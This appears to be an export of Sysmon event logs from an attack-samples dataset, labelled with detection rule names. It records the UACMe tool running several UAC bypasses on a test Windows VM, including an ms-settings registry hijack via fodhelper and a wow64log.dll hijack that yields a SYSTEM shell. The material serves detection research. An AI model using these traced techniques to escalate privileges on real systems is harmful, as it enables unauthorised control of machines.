ProcessGuid: 747F3D96-5809-5D45-0000-00100B233F00
CommandLine: '""C:\Windows\system32\cmd.exe""\system32\cleanmgr.exe /autoclean /d C:'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 09:46:49.331
"
2019-08-03T10:14:02.589463+00:00,HackTool - UACMe Akagi Execution;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,1,5271,MSEDGEWIN10,"Image: C:\Users\IEUser\Desktop\UACME.exe
RuleName: ''
Description: UACMe main module
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: UACMe
Company: Hazardous Environments
ParentProcessId: 5780
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=9E57914D39FBFE785C915E225011892613C4714C,MD5=D57E778DF10F801F47119A04BE990FFD,SHA256=D76815CE3F4B9FE7A611D6F536F65AF313E2AB2F8BB52EF0998487D89A6E7378,IMPHASH=B6789EDFE23DDA911AE37C87444D3DCB
ParentProcessGuid: 747F3D96-5A29-5D45-0000-0010DEB99000
ProcessId: 4440
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-5E6A-5D45-0000-001076639D00
CommandLine: UACME.exe  33
FileVersion: 3.1.9.1905
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-03 10:14:02.567
"
2019-08-03T10:14:02.929209+00:00,Bypass UAC Using DelegateExecute;Shell Open Registry Keys Manipulation,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,13,5272,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\ms-settings\shell\open\command\DelegateExecute
RuleName: PrivEsc - UAC bypass UACME-33
EventType: SetValue
ProcessId: 4440
ProcessGuid: 747F3D96-5E6A-5D45-0000-001076639D00
UtcTime: 2019-08-03 10:14:02.848
Details: (Empty)
"
2019-08-03T10:14:02.934826+00:00,Potential Persistence Using DebugPath;Shell Open Registry Keys Manipulation,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,13,5273,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\ms-settings\shell\open\command\(Default)
RuleName: PrivEsc - UAC bypass UACME-33
EventType: SetValue
ProcessId: 4440
ProcessGuid: 747F3D96-5E6A-5D45-0000-001076639D00
UtcTime: 2019-08-03 10:14:02.848
Details: C:\Windows\system32\cmd.exe
"
2019-08-03T10:14:07.652988+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,1,5274,MSEDGEWIN10,"Image: C:\Windows\System32\fodhelper.exe
RuleName: ''
Description: Features On Demand Helper
TerminalSessionId: 1
ParentCommandLine: UACME.exe  33
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4440
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=4D0DE1C3121F202604A01C6DC6F6A36F4A0A4619,MD5=F23BCF023D5039CCAB3AA40F6A07B817,SHA256=B1223B86D03C3583B84E46A9A6AD009D770FC4114640402EDE19793167593A8F,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: 747F3D96-5E6A-5D45-0000-001076639D00
ProcessId: 4208
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-5E6F-5D45-0000-00108F969D00
CommandLine: '""C:\Windows\system32\fodhelper.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 10:14:07.477
"
2019-08-03T10:14:07.665552+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,1,5275,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 4060
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-5E6F-5D45-0000-00103B989D00
CommandLine: consent.exe 896 324 0000028064421EA0
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 10:14:07.506
"
2019-08-03T10:14:08.065273+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,1,5276,MSEDGEWIN10,"Image: C:\Windows\System32\fodhelper.exe
RuleName: ''
Description: Features On Demand Helper
TerminalSessionId: 1
ParentCommandLine: UACME.exe  33
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4440
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=4D0DE1C3121F202604A01C6DC6F6A36F4A0A4619,MD5=F23BCF023D5039CCAB3AA40F6A07B817,SHA256=B1223B86D03C3583B84E46A9A6AD009D770FC4114640402EDE19793167593A8F,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5
ParentProcessGuid: 747F3D96-5E6A-5D45-0000-001076639D00
ProcessId: 8180
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-5E6F-5D45-0000-001014CA9D00
CommandLine: '""C:\Windows\system32\fodhelper.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 10:14:07.967
"
2019-08-03T10:14:08.472102+00:00,Bypass UAC via Fodhelper.exe;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_33.evtx,1,Microsoft-Windows-Sysmon,1,5277,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\fodhelper.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 8180
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-5E6F-5D45-0000-001014CA9D00
ProcessId: 3656
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-5E70-5D45-0000-0010FCDD9D00
CommandLine: '""C:\Windows\system32\cmd.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Windows\System32\fodhelper.exe
UtcTime: 2019-08-03 10:14:08.401
"
2019-08-03T10:51:46.511813+00:00,HackTool - UACMe Akagi Execution;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5304,MSEDGEWIN10,"Image: C:\Users\IEUser\Desktop\UACME.exe
RuleName: ''
Description: UACMe main module
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: UACMe
Company: Hazardous Environments
ParentProcessId: 5780
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=9E57914D39FBFE785C915E225011892613C4714C,MD5=D57E778DF10F801F47119A04BE990FFD,SHA256=D76815CE3F4B9FE7A611D6F536F65AF313E2AB2F8BB52EF0998487D89A6E7378,IMPHASH=B6789EDFE23DDA911AE37C87444D3DCB
ParentProcessGuid: 747F3D96-5A29-5D45-0000-0010DEB99000
ProcessId: 6380
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-6742-5D45-0000-00104A66B500
CommandLine: UACME.exe  32
FileVersion: 3.1.9.1905
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-03 10:51:46.423
"
2019-08-03T10:51:46.647421+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,11,5305,MSEDGEWIN10,"ProcessGuid: 747F3D96-6742-5D45-0000-00104A66B500
CreationUtcTime: 2019-08-03 10:51:46.599
UtcTime: 2019-08-03 10:51:46.599
ProcessId: 6380
RuleName: PrivEsc - UAC Bypass UACME 32
TargetFilename: C:\Users\IEUser\AppData\Local\Temp\OskSupport.dll
Image: C:\Windows\explorer.exe
"
2019-08-03T10:51:46.685993+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5306,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 8160
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6742-5D45-0000-00102A72B500
CommandLine: consent.exe 896 272 0000028064421EA0
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 10:51:46.636
"
2019-08-03T10:51:47.219516+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5307,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 324
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6743-5D45-0000-0010DAA8B500
CommandLine: consent.exe 896 272 0000028064425400
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 10:51:47.215
"
2019-08-03T10:51:48.431273+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5308,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: UACME.exe  32
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6380
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6742-5D45-0000-00104A66B500
ProcessId: 6456
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-6743-5D45-0000-001068D7B500
CommandLine: 'C:\windows\system32\cmd.exe ""C:\Program Files\Windows Media Player\osk.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 10:51:47.872
"
2019-08-03T10:51:48.675628+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5309,MSEDGEWIN10,"Image: C:\Windows\System32\eventvwr.exe
RuleName: ''
Description: Event Viewer Snapin Launcher
TerminalSessionId: 1
ParentCommandLine: UACME.exe  32
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6380
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=1AF3BB8D63A0ED48DF1F1706B791404DEE28524F,MD5=43129C3BFC9746CE9FFE8E45D10FE050,SHA256=BC87E4F462F00B826EC09AC16B625D0F70439C48FC04A52A41B4CD9E78401F70,IMPHASH=5843AE9886BB500E05E07EE59BB5AD42
ParentProcessGuid: 747F3D96-6742-5D45-0000-00104A66B500
ProcessId: 5840
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-6744-5D45-0000-00108BE4B500
CommandLine: '""C:\Windows\system32\eventvwr.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 10:51:48.006
"
2019-08-03T10:51:48.696407+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5310,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 5124
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6744-5D45-0000-00102FE6B500
CommandLine: consent.exe 896 318 0000028064425400
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 10:51:48.026
"
2019-08-03T10:51:49.371552+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_32.evtx,1,Microsoft-Windows-Sysmon,1,5311,MSEDGEWIN10,"Image: C:\Windows\System32\eventvwr.exe
RuleName: ''
Description: Event Viewer Snapin Launcher
TerminalSessionId: 1
ParentCommandLine: UACME.exe  32
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6380
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=1AF3BB8D63A0ED48DF1F1706B791404DEE28524F,MD5=43129C3BFC9746CE9FFE8E45D10FE050,SHA256=BC87E4F462F00B826EC09AC16B625D0F70439C48FC04A52A41B4CD9E78401F70,IMPHASH=5843AE9886BB500E05E07EE59BB5AD42
ParentProcessGuid: 747F3D96-6742-5D45-0000-00104A66B500
ProcessId: 5524
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6744-5D45-0000-0010040CB600
CommandLine: '""C:\Windows\system32\eventvwr.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 10:51:48.772
"
2019-08-03T11:23:15.364739+00:00,HackTool - UACMe Akagi Execution;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5400,MSEDGEWIN10,"Image: C:\Users\IEUser\Desktop\UACME.exe
RuleName: ''
Description: UACMe main module
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: UACMe
Company: Hazardous Environments
ParentProcessId: 5780
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=9E57914D39FBFE785C915E225011892613C4714C,MD5=D57E778DF10F801F47119A04BE990FFD,SHA256=D76815CE3F4B9FE7A611D6F536F65AF313E2AB2F8BB52EF0998487D89A6E7378,IMPHASH=B6789EDFE23DDA911AE37C87444D3DCB
ParentProcessGuid: 747F3D96-5A29-5D45-0000-0010DEB99000
ProcessId: 7984
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-6EA3-5D45-0000-0010204DE100
CommandLine: UACME.exe  30
FileVersion: 3.1.9.1905
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-03 11:23:15.323
"
2019-08-03T11:23:15.560614+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,11,5401,MSEDGEWIN10,"ProcessGuid: 747F3D96-6EA3-5D45-0000-0010204DE100
CreationUtcTime: 2019-08-03 11:23:15.519
UtcTime: 2019-08-03 11:23:15.519
ProcessId: 7984
RuleName: PrivEsc - UAC Bypass UACME 30
TargetFilename: C:\Users\IEUser\AppData\Local\Temp\wow64log.dll
Image: C:\Windows\explorer.exe
"
2019-08-03T11:23:15.579857+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5402,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 3640
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6EA3-5D45-0000-0010FB58E100
CommandLine: consent.exe 896 272 0000028064427C00
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 11:23:15.564
"
2019-08-03T11:23:17.433719+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5403,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: UACME.exe  30
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7984
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=8927B37C0265394724D979D84EE1AA6E4F7D7E5A,MD5=6C81724C47077509C4CC874E34008FC3,SHA256=9A18550136D91FD0AF3D8D3E202A5A348DDEE9639498F2B5FC9630E83406D7E1,IMPHASH=43545885005F51C762261EDCD235042B
ParentProcessGuid: 747F3D96-6EA3-5D45-0000-0010204DE100
ProcessId: 3340
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-6EA4-5D45-0000-0010DD92E100
CommandLine: '""C:\Windows\syswow64\wusa.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 11:23:16.831
"
2019-08-03T11:23:17.541143+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5404,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 6292
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6EA5-5D45-0000-0010E19FE100
CommandLine: consent.exe 896 294 0000028064427C00
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-03 11:23:17.015
"
2019-08-03T11:23:18.619445+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5405,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\wusa.exe
RuleName: ''
Description: Windows Update Standalone Installer
TerminalSessionId: 1
ParentCommandLine: UACME.exe  30
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7984
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=8927B37C0265394724D979D84EE1AA6E4F7D7E5A,MD5=6C81724C47077509C4CC874E34008FC3,SHA256=9A18550136D91FD0AF3D8D3E202A5A348DDEE9639498F2B5FC9630E83406D7E1,IMPHASH=43545885005F51C762261EDCD235042B
ParentProcessGuid: 747F3D96-6EA3-5D45-0000-0010204DE100
ProcessId: 6312
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6EA5-5D45-0000-0010C5C4E100
CommandLine: '""C:\Windows\syswow64\wusa.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-03 11:23:17.556
"
2019-08-03T11:23:18.666713+00:00,Potential DLL Sideloading Of Non-Existent DLLs From System Folders,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,7,5406,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\WerFault.exe
Signature: ''
Hashes: SHA1=F26AD3298954CE6C5D01DC0ACC2B4A516554B430,MD5=7B97BFB44F4B8163AC336B0C85F62763,SHA256=5B08DFA2FA7CC474632485F1EC66CDCC0EEC9560C3630C1A8588EE345153209D,IMPHASH=3432208F552ABE01A0293828CD0796BE
RuleName: PrivEsc - DLL Hijack - UACME 30
Description: UACMe WOW64 logger DLL
ProcessId: 932
SignatureStatus: Unavailable
ProcessGuid: 747F3D96-6EA5-5D45-0000-00107AC9E100
Signed: 'false'
FileVersion: 3.1.8.1904
ImageLoaded: C:\Windows\System32\wow64log.dll
Product: UACMe
Company: Hazardous Environments
UtcTime: 2019-08-03 11:23:17.609
"
2019-08-03T11:23:18.694577+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process;Unusual Parent Process For Cmd.EXE,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_30.evtx,1,Microsoft-Windows-Sysmon,1,5407,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: C:\Windows\SysWOW64\WerFault.exe -pss -s 444 -p 6312 -ip 6312
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 932
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6EA5-5D45-0000-00107AC9E100
ProcessId: 6068
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6EA5-5D45-0000-001032CCE100
CommandLine: '""C:\Windows\system32\cmd.exe""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\SysWOW64\WerFault.exe
UtcTime: 2019-08-03 11:23:17.636
"
